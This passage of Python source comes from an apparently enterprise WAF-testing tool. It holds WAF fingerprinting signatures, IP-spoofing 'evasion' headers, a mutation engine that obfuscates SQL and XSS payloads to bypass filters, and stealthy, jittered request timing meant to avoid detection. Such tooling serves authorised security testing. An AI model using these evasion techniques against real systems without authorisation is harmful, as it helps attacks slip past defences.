        self._write_log(message, "WARNING", category, self.log_file, test_id, metadata)
    
    def debug(self, message, category="DEBUG", test_id=None, metadata=None):
        if EnterpriseConfig.DEBUG_MODE:
            self._write_log(message, "DEBUG", category, self.debug_file, test_id, metadata)
    
    def waf_detection(self, message, test_id=None, metadata=None):
        self._write_log(message, "WAF_DETECT", "WAF_ANALYSIS", self.waf_detection_file, test_id, metadata)
    
    def intelligence(self, message, test_id=None, metadata=None):
        self._write_log(message, "INTEL", "THREAT_INTEL", self.intelligence_file, test_id, metadata)
    
    def performance(self, message, test_id=None, response_time=None, response_size=None, status_code=None, waf_confidence=None):
        self._write_log(message, "PERF", "PERFORMANCE", self.performance_file, test_id)
        
        # Store performance metrics in database
        if test_id and response_time:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO performance_metrics (timestamp, test_id, response_time, response_size, status_code, waf_confidence) VALUES (?, ?, ?, ?, ?, ?)',
                (datetime.now().isoformat(), test_id, response_time, response_size, status_code, waf_confidence)
            )
            conn.commit()
            conn.close()

logger = EnterpriseLogger()

# Enterprise User Agent Pool with realistic fingerprints and rotation
USER_AGENT_POOLS = {
    'chrome': [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    ],
    'firefox': [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
    ],
    'safari': [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
    ],
    'edge': [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
    ]
}

# Advanced evasion headers with browser-specific patterns
EVASION_HEADER_PROFILES = {
    'standard': [
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"},
        {"Accept-Language": "en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,it;q=0.5"},
        {"Accept-Encoding": "gzip, deflate, br, zstd"},
        {"Connection": "keep-alive"},
        {"Upgrade-Insecure-Requests": "1"}
    ],
    'security_conscious': [
        {"DNT": "1"},
        {"Sec-Fetch-Dest": "document"},
        {"Sec-Fetch-Mode": "navigate"},
        {"Sec-Fetch-Site": "none"},
        {"Sec-Fetch-User": "?1"},
        {"Sec-GPC": "1"}
    ],
    'chrome_specific': [
        {"Sec-CH-UA": '"Not_A Brand";v="8", "Chromium";v="122", "Google Chrome";v="122"'},
        {"Sec-CH-UA-Mobile": "?0"},
        {"Sec-CH-UA-Platform": '"Windows"'},
        {"Sec-CH-UA-Platform-Version": '"10.0.0"'}
    ],
    'advanced_evasion': [
        {"Cache-Control": "max-age=0"},
        {"Pragma": "no-cache"},
        {"Priority": "u=0, i"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"}
    ]
}

# AI-Powered WAF Detection Engine
class AIWAFDetector:
    def __init__(self):
        self.waf_signatures = self._load_enhanced_signatures()
        self.behavioral_patterns = defaultdict(list)
        self.confidence_cache = {}
        self.learning_samples = []
        self.pattern_weights = self._initialize_pattern_weights()
    
    def _load_enhanced_signatures(self):
        """Load comprehensive WAF signatures with AI scoring"""
        return {
            'cloudflare': {
                'headers': {
                    'primary': ['cf-ray', 'cloudflare', 'cf-cache-status', 'cf-request-id'],
                    'secondary': ['__cflb', '__cfduid', 'cf-connecting-ip', 'cf-ipcountry', 'cf-visitor']
                },
                'body_patterns': [
                    r'cloudflare[\\s\\-_]?(security|firewall|protection)',
                    r'attention required.*cloudflare',
                    r'ray id[:\\s]*[a-f0-9]{16}',
                    r'cloudflare.*checking.*browser',
                    r'enable javascript.*cloudflare',
                    r'ddos protection.*cloudflare'
                ],
                'status_behaviors': {403: 0.9, 503: 0.8, 429: 0.95, 520: 0.9, 521: 0.9, 522: 0.8, 523: 0.8, 524: 0.8},
                'response_patterns': {
                    'challenge_page': r'<title>.*please wait.*</title>',
                    'block_page': r'error\\s*403',
                    'captcha': r'captcha|challenge'
                },
                'timing_signatures': {'challenge_delay': (3.0, 8.0), 'fast_block': (0.0, 0.5)},
                'confidence_base': 0.98,
                'prevalence_score': 0.95
            },
            'incapsula': {
                'headers': {
                    'primary': ['incap-ses', 'visid_incap', 'x-iinfo'],
                    'secondary': ['incap_ses', 'incapsula-session', 'x-cdn']
                },
                'body_patterns': [
                    r'incapsula.*incident.*id',
                    r'imperva.*security',
                    r'request unsuccessful.*incapsula',
                    r'incapsula.*reference[:\\s]*\\d+',
                    r'imperva.*protection'
                ],
                'status_behaviors': {406: 0.95, 403: 0.85, 302: 0.7},
                'response_patterns': {
                    'block_page': r'incapsula.*blocked',
                    'redirect': r'/_Incapsula_Resource'
                },
                'confidence_base': 0.92,
                'prevalence_score': 0.85
            },
            'sucuri': {
                'headers': {
                    'primary': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
                    'secondary': ['sucuri-block', 'x-sucuri-country']
                },
                'body_patterns': [
                    r'sucuri website firewall',
                    r'access denied.*sucuri',
                    r'blocked by sucuri',
                    r'sucuri.*security.*event',
                    r'website firewall.*sucuri'
                ],
                'status_behaviors': {403: 0.9, 406: 0.8},
                'confidence_base': 0.90,
                'prevalence_score': 0.75
            },
            'akamai': {
                'headers': {
                    'primary': ['akamai', 'x-akamai-request-id', 'ak-lb'],
                    'secondary': ['akamai-ghost-ip', 'x-akamai-config-log-detail', 'akamai-origin-hop']
                },
                'body_patterns': [
                    r'akamai.*reference[:\\s]*[0-9a-f\\.]+',
                    r'reference[:\\s]*[0-9a-f]{8}\\.[0-9a-f]{8}\\.[0-9a-f]{8}',
                    r'akamai.*security.*policy',
                    r'access denied.*akamai'
                ],
                'status_behaviors': {403: 0.85, 999: 0.95, 429: 0.8},
                'confidence_base': 0.88,
                'prevalence_score': 0.90
            },
            'aws_waf': {
                'headers': {
                    'primary': ['x-amzn-requestid', 'x-amzn-trace-id', 'awselb'],
                    'secondary': ['x-amz-apigw-id', 'x-amzn-remapped-content-length', 'server: awselb']
                },
                'body_patterns': [
                    r'aws.*forbidden',
                    r'amazon.*access denied',
                    r'awselb.*error',
                    r'aws.*waf.*blocked'
                ],
                'status_behaviors': {403: 0.8, 502: 0.6},
                'confidence_base': 0.82,
                'prevalence_score': 0.80
            },
            'f5_bigip': {
                'headers': {
                    'primary': ['f5-', 'bigip', 'x-waf-event-info'],
                    'secondary': ['f5-bigip', 'x-f5-', 'bigip-cookie']
                },
                'body_patterns': [
                    r'f5.*application security',
                    r'bigip.*blocked',
                    r'f5.*violation',
                    r'request rejected.*f5',
                    r'asm.*policy.*violation'
                ],
                'status_behaviors': {403: 0.9, 409: 0.85, 412: 0.8},
                'confidence_base': 0.87,
                'prevalence_score': 0.70
            },
            'fortinet': {
                'headers': {
                    'primary': ['fortigate', 'x-fw-', 'fortinet'],
                    'secondary': ['fortiweb', 'fortigate-authcookie']
                },
                'body_patterns': [
                    r'fortinet.*security',
                    r'fortigate.*blocked',
                    r'fortiweb.*violation',
                    r'fortigate.*policy.*violation'
                ],
                'status_behaviors': {403: 0.9, 302: 0.7},
                'confidence_base': 0.85,
                'prevalence_score': 0.65
            },
            'barracuda': {
                'headers': {
                    'primary': ['barra', 'x-barracuda', 'barracuda-waf'],
                    'secondary': ['barracuda-cache-status']
                },
                'body_patterns': [
                    r'barracuda.*firewall',
                    r'web application firewall.*barracuda',
                    r'barracuda.*blocked',
                    r'barracuda.*security.*violation'
                ],
                'status_behaviors': {403: 0.9, 406: 0.8},
                'confidence_base': 0.84,
                'prevalence_score': 0.60
            },
            'modsecurity': {
                'headers': {
                    'primary': ['mod_security', 'modsecurity'],
                    'secondary': ['x-mod-security']
                },
                'body_patterns': [
                    r'mod_security.*violation',
                    r'modsecurity.*blocked',
                    r'apache.*mod_security',
                    r'modsecurity.*rule.*triggered'
                ],
                'status_behaviors': {403: 0.8, 406: 0.75, 400: 0.6},
                'confidence_base': 0.78,
                'prevalence_score': 0.55
            },
            'wordfence': {
                'headers': {
                    'primary': ['wordfence'],
                    'secondary': ['x-wordfence']
                },
                'body_patterns': [
                    r'wordfence.*security',
                    r'blocked by wordfence',
                    r'wordfence.*firewall',
                    r'wordfence.*blocked.*ip'
                ],
                'status_behaviors': {403: 0.9, 406: 0.8},
                'confidence_base': 0.82,
                'prevalence_score': 0.50
            }
        }
    
    def _initialize_pattern_weights(self):
        """Initialize machine learning weights for pattern detection"""
        return {
            'header_weight': 0.4,
            'body_weight': 0.3,
            'status_weight': 0.2,
            'timing_weight': 0.1,
            'prevalence_weight': 0.05
        }
    
    def analyze_response_advanced(self, headers: Dict, status_code: int, response_body: str, 
                                response_time: float, request_payload: str) -> Tuple[bool, str, float, List[str], Dict]:
        """Advanced AI-powered WAF detection with behavioral analysis"""
        
        best_match = {"name": "Unknown", "confidence": 0.0, "indicators": [], "analysis": {}}
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = response_body.lower()[:3000]  # Analyze first 3KB
        
        # Cache check
        cache_key = hashlib.md5(f"{headers}{status_code}{response_body[:500]}".encode()).hexdigest()
        if EnterpriseConfig.ENABLE_CACHING and cache_key in self.confidence_cache:
            cached_result = self.confidence_cache[cache_key]
            logger.debug(f"Cache hit for WAF detection: {cached_result['name']}")
            return cached_result['detected'], cached_result['name'], cached_result['confidence'], cached_result['indicators'], cached_result['analysis']
        
        for waf_name, signature in self.waf_signatures.items():
            confidence = 0.0
            indicators = []
            analysis = {
                'header_matches': [],
                'body_matches': [],
                'status_match': False,
                'timing_match': False,
                'behavioral_score': 0.0
            }
            
            # Enhanced header analysis with primary/secondary weights
            primary_headers = signature['headers'].get('primary', [])
            secondary_headers = signature['headers'].get('secondary', [])
            
            for header_indicator in primary_headers:
                for header_name, header_value in headers_lower.items():
                    if header_indicator in header_name or header_indicator in header_value:
                        weight = 0.8 * self.pattern_weights['header_weight']
                        confidence += signature['confidence_base'] * weight
                        indicators.append(f"Primary Header: {header_name}")
                        analysis['header_matches'].append({'type': 'primary', 'header': header_name, 'indicator': header_indicator})
                        logger.waf_detection(f"Primary header match for {waf_name}: {header_name}")
            
            for header_indicator in secondary_headers:
                for header_name, header_value in headers_lower.items():
                    if header_indicator in header_name or header_indicator in header_value:
                        weight = 0.4 * self.pattern_weights['header_weight']
                        confidence += signature['confidence_base'] * weight
                        indicators.append(f"Secondary Header: {header_name}")
                        analysis['header_matches'].append({'type': 'secondary', 'header': header_name, 'indicator': header_indicator})
            
            # Advanced body pattern analysis with regex scoring
            for pattern in signature.get('body_patterns', []):
                matches = re.finditer(pattern, body_lower, re.IGNORECASE)
                for match in matches:
                    match_quality = len(match.group()) / len(pattern)  # Quality score based on match length
                    weight = match_quality * self.pattern_weights['body_weight']
                    confidence += signature['confidence_base'] * weight
                    indicators.append(f"Body Pattern: {pattern[:50]}...")
                    analysis['body_matches'].append({'pattern': pattern, 'match': match.group(), 'quality': match_quality})
                    logger.waf_detection(f"Body pattern match for {waf_name}: {pattern}")
            
            # Enhanced status code behavior analysis
            status_behaviors = signature.get('status_behaviors', {})
            if status_code in status_behaviors:
                behavior_confidence = status_behaviors[status_code]
                weight = self.pattern_weights['status_weight']
                confidence += signature['confidence_base'] * behavior_confidence * weight
                indicators.append(f"Status Behavior: {status_code}")
                analysis['status_match'] = True
                logger.waf_detection(f"Status behavior match for {waf_name}: {status_code}")
            
            # Timing analysis for WAF behavior patterns
            timing_sigs = signature.get('timing_signatures', {})
            for timing_type, (min_time, max_time) in timing_sigs.items():
                if min_time <= response_time <= max_time:
                    weight = self.pattern_weights['timing_weight']
                    confidence += signature['confidence_base'] * weight
                    indicators.append(f"Timing Pattern: {timing_type} ({response_time:.2f}s)")
                    analysis['timing_match'] = True
            
            # Response pattern analysis
            response_patterns = signature.get('response_patterns', {})
            for pattern_type, pattern in response_patterns.items():
                if re.search(pattern, body_lower, re.IGNORECASE):
                    confidence += signature['confidence_base'] * 0.3
                    indicators.append(f"Response Pattern: {pattern_type}")
            
            # Behavioral learning and pattern recognition
            if EnterpriseConfig.ENABLE_BEHAVIORAL_LEARNING:
                behavioral_score = self._analyze_behavioral_patterns(waf_name, headers, status_code, response_time, request_payload)
                confidence += behavioral_score
                analysis['behavioral_score'] = behavioral_score
            
            # Prevalence-based confidence adjustment
            prevalence_score = signature.get('prevalence_score', 0.5)
            confidence *= (1 + prevalence_score * self.pattern_weights['prevalence_weight'])
            
            # Normalize confidence
            confidence = min(confidence, 1.0)
            
            if confidence > best_match["confidence"]:
                best_match = {
                    "name": waf_name.replace('_', ' ').title(),
                    "confidence": confidence,
                    "indicators": indicators,
                    "analysis": analysis
                }
        
        # Generic WAF detection with enhanced heuristics
        if best_match["confidence"] < EnterpriseConfig.CONFIDENCE_THRESHOLD:
            generic_analysis = self._generic_waf_detection(headers_lower, status_code, body_lower, response_time)
            if generic_analysis['confidence'] > best_match["confidence"]:
                best_match = generic_analysis
        
        # Cache the result
        if EnterpriseConfig.ENABLE_CACHING:
            cache_result = {
                'detected': best_match["confidence"] > 0.3,
                'name': best_match["name"],
                'confidence': best_match["confidence"],
                'indicators': best_match["indicators"],
                'analysis': best_match["analysis"]
            }
            self.confidence_cache[cache_key] = cache_result
        
        # Store learning sample
        if EnterpriseConfig.ENABLE_BEHAVIORAL_LEARNING:
            self._store_learning_sample(headers, status_code, response_body, response_time, best_match)
        
        detected = best_match["confidence"] > 0.3
        return detected, best_match["name"], best_match["confidence"], best_match["indicators"], best_match["analysis"]
    
    def _analyze_behavioral_patterns(self, waf_name: str, headers: Dict, status_code: int, response_time: float, payload: str) -> float:
        """Analyze behavioral patterns for machine learning enhancement"""
        behavioral_score = 0.0
        
        # Response time pattern analysis
        if waf_name in self.behavioral_patterns:
            historical_times = [sample['response_time'] for sample in self.behavioral_patterns[waf_name]]
            if historical_times and len(historical_times) > 5:
                mean_time = statistics.mean(historical_times)
                std_time = statistics.stdev(historical_times)
                z_score = abs((response_time - mean_time) / std_time) if std_time > 0 else 0
                
                # If response time is within 1 standard deviation, increase confidence
                if z_score <= 1.0:
                    behavioral_score += 0.1
        
        # Header consistency pattern
        header_signature = set(headers.keys())
        if waf_name in self.behavioral_patterns:
            historical_headers = [set(sample.get('headers', {}).keys()) for sample in self.behavioral_patterns[waf_name]]
            if historical_headers:
                common_headers = set.intersection(*historical_headers) if len(historical_headers) > 1 else historical_headers[0]
                overlap = len(header_signature & common_headers) / len(header_signature | common_headers) if header_signature | common_headers else 0
                behavioral_score += overlap * 0.15
        
        return behavioral_score
    
    def _generic_waf_detection(self, headers_lower: Dict, status_code: int, body_lower: str, response_time: float) -> Dict:
        """Enhanced generic WAF detection with heuristics"""
        confidence = 0.0
        indicators = []
        analysis = {'method': 'generic_heuristics'}
        
        # Status code analysis
        if status_code in EnterpriseConfig.BLOCKED_STATUS_CODES:
            confidence += 0.4
            indicators.append(f"Blocking status code: {status_code}")
        
        # Generic WAF keywords
        keyword_matches = 0
        for keyword in EnterpriseConfig.WAF_KEYWORDS:
            if keyword in body_lower:
                keyword_matches += 1
                indicators.append(f"WAF keyword: {keyword}")
        
        if keyword_matches > 0:
            confidence += min(keyword_matches * 0.15, 0.6)
        
        # Response characteristics analysis
        if len(body_lower) < 200 and status_code in [403, 406]:
            confidence += 0.3
            indicators.append("Short blocking response")
        
        # Redirect pattern analysis
        if status_code in [301, 302, 303, 307, 308] and 'location' in headers_lower:
            location = headers_lower['location']
            suspicious_terms = ['block', 'denied', 'security', 'captcha', 'challenge', 'firewall']
            if any(term in location for term in suspicious_terms):
                confidence += 0.4
                indicators.append(f"Suspicious redirect: {location}")
        
        # Server header analysis for generic patterns
        server_header = headers_lower.get('server', '')
        generic_server_indicators = ['waf', 'firewall', 'security', 'protection']
        for indicator in generic_server_indicators:
            if indicator in server_header:
                confidence += 0.2
                indicators.append(f"Generic server indicator: {indicator}")
        
        return {
            "name": "Generic WAF",
            "confidence": min(confidence, 1.0),
            "indicators": indicators,
            "analysis": analysis
        }
    
    def _store_learning_sample(self, headers: Dict, status_code: int, response_body: str, response_time: float, detection_result: Dict):
        """Store samples for machine learning improvement"""
        sample = {
            'timestamp': datetime.now().isoformat(),
            'headers': headers,
            'status_code': status_code,
            'response_body_hash': hashlib.md5(response_body.encode()).hexdigest(),
            'response_time': response_time,
            'detection_result': detection_result
        }
        
        self.learning_samples.append(sample)
        
        # Store behavioral patterns
        waf_name = detection_result['name']
        if detection_result['confidence'] > 0.5:
            self.behavioral_patterns[waf_name].append(sample)
        
        # Limit storage to prevent memory issues
        if len(self.learning_samples) > EnterpriseConfig.PATTERN_LEARNING_SAMPLES:
            self.learning_samples = self.learning_samples[-EnterpriseConfig.PATTERN_LEARNING_SAMPLES:]
        
        for waf in self.behavioral_patterns:
            if len(self.behavioral_patterns[waf]) > 20:
                self.behavioral_patterns[waf] = self.behavioral_patterns[waf][-20:]

# Initialize AI detector
ai_waf_detector = AIWAFDetector()

# Advanced Payload Mutation Engine
class PayloadMutationEngine:
    def __init__(self):
        self.encoding_methods = [
            'url_encode', 'double_url_encode', 'unicode_encode', 'html_entity_encode',
            'base64_encode', 'hex_encode', 'mixed_case', 'space_substitution',
            'comment_insertion', 'concatenation', 'char_substitution'
        ]
        
        self.evasion_techniques = [
            'case_variation', 'whitespace_manipulation', 'encoding_mixing',
            'payload_splitting', 'null_byte_insertion', 'tab_newline_substitution'
        ]
    
    def generate_payload_variants(self, original_payload: str, max_variants: int = 15) -> List[Dict]:
        """Generate advanced payload variants with mutation techniques"""
        if not EnterpriseConfig.ENABLE_PAYLOAD_MUTATION:
            return [{'payload': original_payload, 'encoding': 'original', 'technique': 'none'}]
        
        variants = [{'payload': original_payload, 'encoding': 'original', 'technique': 'none'}]
        
        try:
            # Basic encoding variations
            variants.extend([
                {'payload': quote(original_payload), 'encoding': 'url', 'technique': 'url_encode'},
                {'payload': quote(quote(original_payload)), 'encoding': 'double_url', 'technique': 'double_url_encode'},
            ])
            
            # Advanced encoding techniques
            if ":" not in original_payload:  # Data payloads
                try:
                    b64_payload = base64.b64encode(original_payload.encode('utf-8')).decode('ascii')
                    variants.append({'payload': b64_payload, 'encoding': 'base64', 'technique': 'base64_encode'})
                except Exception:
                    pass
            
            # Unicode encoding with proper escaping
            unicode_chars = [c for c in original_payload if ord(c) > 127]
            if unicode_chars:
                unicode_payload = original_payload
                for char in unicode_chars:
                    unicode_escape = f'\\\\u{ord(char):04x}'
                    unicode_payload = unicode_payload.replace(char, unicode_escape)
                variants.append({'payload': unicode_payload, 'encoding': 'unicode', 'technique': 'unicode_encode'})
            
            # HTML entity encoding
            html_entities = {'<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '&': '&amp;', '/': '&#x2F;'}
            html_payload = original_payload
            for char, entity in html_entities.items():
                html_payload = html_payload.replace(char, entity)
            if html_payload != original_payload:
                variants.append({'payload': html_payload, 'encoding': 'html_entity', 'technique': 'html_entity_encode'})
            
            # Case variation techniques
            case_variants = [
                original_payload.upper(),
                original_payload.lower(),
                ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(original_payload))
            ]
            for i, variant in enumerate(case_variants):
                if variant != original_payload:
                    variants.append({'payload': variant, 'encoding': f'case_variant_{i}', 'technique': 'case_variation'})
            
            # Whitespace manipulation
            ws_variants = [
                original_payload.replace(' ', '\\t'),
                original_payload.replace(' ', '\\n'),
                original_payload.replace(' ', '+'),
                original_payload.replace(' ', '%20')
            ]
            for i, variant in enumerate(ws_variants):
                if variant != original_payload:
                    variants.append({'payload': variant, 'encoding': f'whitespace_{i}', 'technique': 'whitespace_manipulation'})
            
            # Comment insertion for SQL/XSS payloads
            if any(keyword in original_payload.lower() for keyword in ['select', 'union', 'script', 'alert']):
                comment_variants = [
                    original_payload.replace(' ', '/**/ '),
                    original_payload.replace('=', '/**/=/**/'),
                    original_payload.replace('(', '/**/(/**/'),
                ]
                for i, variant in enumerate(comment_variants):
                    if variant != original_payload:
                        variants.append({'payload': variant, 'encoding': f'comment_insertion_{i}', 'technique': 'comment_insertion'})
            
            # Mixed case for headers
            if ":" in original_payload:
                header_parts = original_payload.split(":", 1)
                if len(header_parts) == 2:
                    header_name = header_parts[0]
                    mixed_case_variants = [
                        ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(header_name)),
                        header_name.upper(),
                        header_name.lower()
                    ]
                    for i, case_variant in enumerate(mixed_case_variants):
                        if case_variant != header_name:
                            mixed_payload = f"{case_variant}:{header_parts[1]}"
                            variants.append({'payload': mixed_payload, 'encoding': f'header_case_{i}', 'technique': 'mixed_case'})
            
            # Advanced concatenation techniques
            if len(original_payload) > 4:
                mid_point = len(original_payload) // 2
                concat_variants = [
                    f"{original_payload[:mid_point]}'+'{original_payload[mid_point:]}",
                    f'{original_payload[:mid_point]}"+"{original_payload[mid_point:]}',
                ]
                for i, variant in enumerate(concat_variants):
                    variants.append({'payload': variant, 'encoding': f'concatenation_{i}', 'technique': 'concatenation'})
            
            # Character substitution
            char_subs = {'=': '%3D', '(': '%28', ')': '%29', ' ': '%20', '<': '%3C', '>': '%3E'}
            for char, sub in char_subs.items():
                if char in original_payload:
                    sub_payload = original_payload.replace(char, sub)
                    variants.append({'payload': sub_payload, 'encoding': f'char_sub_{char}', 'technique': 'char_substitution'})
        
        except Exception as e:
            logger.debug(f"Payload mutation error: {e}")
        
        # Remove duplicates while preserving order
        seen = set()
        unique_variants = []
        for variant in variants:
            if variant['payload'] not in seen:
                seen.add(variant['payload'])
                unique_variants.append(variant)
        
        return unique_variants[:max_variants]

# Initialize mutation engine
mutation_engine = PayloadMutationEngine()

# Enhanced Test Result with AI Analysis
@dataclass
class EnterpriseTestResult:
    id: int
    category: str
    name: str
    description: str
    severity: str
    payload: str
    original_payload: str = ""
    payload_variants: List[Dict] = field(default_factory=list)
    successful_variant: Dict = field(default_factory=dict)
    status_code: Optional[int] = None
    blocked: bool = False
    result: str = "UNKNOWN"
    duration: float = 0.0
    response_size: int = 0
    response_headers: Dict = field(default_factory=dict)
    response_body_snippet: str = ""
    response_hash: str = ""
    waf_detected: bool = False
    waf_type: str = "Unknown"
    waf_confidence: float = 0.0
    waf_indicators: List[str] = field(default_factory=list)
    waf_analysis: Dict = field(default_factory=dict)
    ai_analysis: Dict = field(default_factory=dict)
    behavioral_analysis: Dict = field(default_factory=dict)
    error: Optional[str] = None
    timestamp: str = ""
    retry_count: int = 0
    detection_method: str = ""
    recommendation: str = ""
    risk_score: int = 0
    compliance_impact: Dict = field(default_factory=dict)
    threat_intelligence: Dict = field(default_factory=dict)
    performance_metrics: Dict = field(default_factory=dict)

class EnterprisePerformanceMetrics:
    def __init__(self):
        self.response_times = []
        self.success_rate = 0.0
        self.average_response_time = 0.0
        self.total_data_transferred = 0
        self.requests_per_second = 0.0
        self.start_time = time.time()
        self.waf_response_patterns = defaultdict(list)
        self.error_patterns = defaultdict(int)
        self.payload_effectiveness = defaultdict(lambda: {'total': 0, 'bypassed': 0})

class EnterpriseTestResults:
    def __init__(self):
        self.total = 0
        self.blocked = 0
        self.bypassed = 0
        self.failed = 0
        self.tests: List[EnterpriseTestResult] = []
        self.waf_fingerprints = set()
        self.performance = EnterprisePerformanceMetrics()
        self.categories_tested = set()
        self.behavior_patterns = defaultdict(int)
        self.compliance_scores = {}
        self.threat_landscape = {}
        
    def add_result(self, result: EnterpriseTestResult):
        self.tests.append(result)
        self.total += 1
        self.categories_tested.add(result.category)
        
        if result.result == "BLOCKED":
            self.blocked += 1
        elif result.result == "BYPASSED":
            self.bypassed += 1
        elif result.result == "FAILED":
            self.failed += 1
            
        if result.waf_type != "Unknown":
            self.waf_fingerprints.add(result.waf_type)
        
        # Update performance metrics
        if result.duration > 0:
            self.performance.response_times.append(result.duration)
        if result.response_size > 0:
            self.performance.total_data_transferred += result.response_size
        
        # Track behavior patterns
        if result.status_code:
            self.behavior_patterns[result.status_code] += 1
        
        # Update payload effectiveness tracking
        for variant in result.payload_variants:
            encoding = variant.get('encoding', 'unknown')
            self.performance.payload_effectiveness[encoding]['total'] += 1
            if result.result == "BYPASSED":
                self.performance.payload_effectiveness[encoding]['bypassed'] += 1
    
    def get_effectiveness(self) -> float:
        if self.total == 0:
            return 0.0
        return (self.blocked / self.total) * 100
    
    def calculate_performance_metrics(self):
        if self.performance.response_times:
            self.performance.average_response_time = statistics.mean(self.performance.response_times)
        
        total_time = time.time() - self.performance.start_time
        if total_time > 0:
            self.performance.requests_per_second = self.total / total_time
        
        if self.total > 0:
            self.performance.success_rate = ((self.blocked + self.bypassed) / self.total) * 100
    
    def generate_compliance_scores(self):
        """Generate compliance scores for various standards"""
        effectiveness = self.get_effectiveness()
        
        self.compliance_scores = {
            'owasp_asvs': {
                'score': min(effectiveness * 1.2, 100),  # OWASP ASVS requirements
                'level': 'Level 3' if effectiveness > 90 else 'Level 2' if effectiveness > 75 else 'Level 1',
                'requirements_met': effectiveness > 80
            },
            'pci_dss': {
                'score': min(effectiveness * 1.1, 100),  # PCI DSS requirements
                'compliant': effectiveness > 85,
                'risk_level': 'Low' if effectiveness > 85 else 'Medium' if effectiveness > 70 else 'High'
            },
            'iso_27001': {
                'score': effectiveness,
                'compliant': effectiveness > 80,
                'control_effectiveness': 'Adequate' if effectiveness > 80 else 'Needs Improvement'
            },
            'nist_csf': {
                'score': effectiveness,
                'maturity_level': 'Optimizing' if effectiveness > 95 else 'Managed' if effectiveness > 80 else 'Defined' if effectiveness > 65 else 'Repeatable'
            }
        }

# Initialize enterprise results
results = EnterpriseTestResults()

def intelligent_traffic_shaping():
    """Advanced traffic shaping to avoid detection"""
    if not EnterpriseConfig.ENABLE_TRAFFIC_SHAPING:
        base_delay = random.uniform(EnterpriseConfig.MIN_DELAY, EnterpriseConfig.MAX_DELAY)
        time.sleep(base_delay)
        return base_delay
    
    # Analyze recent response patterns
    recent_times = results.performance.response_times[-10:] if results.performance.response_times else []
    
    if recent_times:
        avg_response = statistics.mean(recent_times)
        # Adaptive delay based on server characteristics
        if avg_response > 3.0:  # Slow server
            delay_multiplier = 1.8
        elif avg_response > 1.0:  # Medium server
            delay_multiplier = 1.2
        else:  # Fast server
            delay_multiplier = 0.8
    else:
        delay_multiplier = 1.0
    
    # Human-like timing patterns
    base_delay = random.uniform(EnterpriseConfig.MIN_DELAY, EnterpriseConfig.MAX_DELAY)
    
    # Occasional longer pauses to simulate human behavior
    if random.random() < 0.1:  # 10% chance of longer pause
        base_delay *= random.uniform(3.0, 8.0)
    
    # Apply server-based adjustment
    final_delay = base_delay * delay_multiplier
    
    # Add micro-jitter to avoid pattern detection
    jitter = random.uniform(-0.1, 0.1)
    final_delay = max(0.1, final_delay + jitter)
    
    time.sleep(final_delay)
    return final_delay

def prepare_stealth_request(payload_variant: Dict) -> Tuple[Dict, Optional[str], str]:
    """Prepare request with advanced stealth techniques"""
    payload = payload_variant['payload']
    
    # Browser profile selection with rotation
    browser_profiles = list(USER_AGENT_POOLS.keys())
    selected_browser = random.choice(browser_profiles)
    user_agent = random.choice(USER_AGENT_POOLS[selected_browser])
    
    headers = {"User-Agent": user_agent}
    
    # Header profile selection based on stealth mode
    if EnterpriseConfig.ENABLE_STEALTH_MODE:
        # Use minimal headers to avoid fingerprinting
        header_profiles = ['standard']
        if random.random() < 0.3:  # Occasionally use security-conscious headers
            header_profiles.append('security_conscious')
    else:
        # Use all available header profiles
        header_profiles = list(EVASION_HEADER_PROFILES.keys())
    
    # Apply selected header profiles
    num_profiles = random.randint(1, min(3, len(header_profiles)))
    selected_profiles = random.sample(header_profiles, num_profiles)
    
    for profile in selected_profiles:
        profile_headers = random.sample(EVASION_HEADER_PROFILES[profile], 
                                      random.randint(1, len(EVASION_HEADER_PROFILES[profile])))
        for header_set in profile_headers:
            headers.update(header_set)
    
    # Advanced anti-fingerprinting
    if EnterpriseConfig.ENABLE_STEALTH_MODE:
        # Randomize header order by recreating dict
        header_items = list(headers.items())
        random.shuffle(header_items)
        headers = dict(header_items)
        
        # Add realistic timing-based headers
        headers["X-Request-Start"] = str(int(time.time() * 1000))
        headers["X-Client-Session"] = str(uuid.uuid4())[:16]
        
        # Vary Accept header slightly
        if "Accept" in headers:
            accept_variations = [
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            ]
            headers["Accept"] = random.choice(accept_variations)
    
    data = None
    test_url = TARGET_URL
    
    # Enhanced payload parsing with variant information
    if ":" in payload and not payload.startswith(("http://", "https://")):
        # Header payload
        try:
            header_name, header_value = payload.split(":", 1)
            headers[header_name.strip()] = header_value.strip()
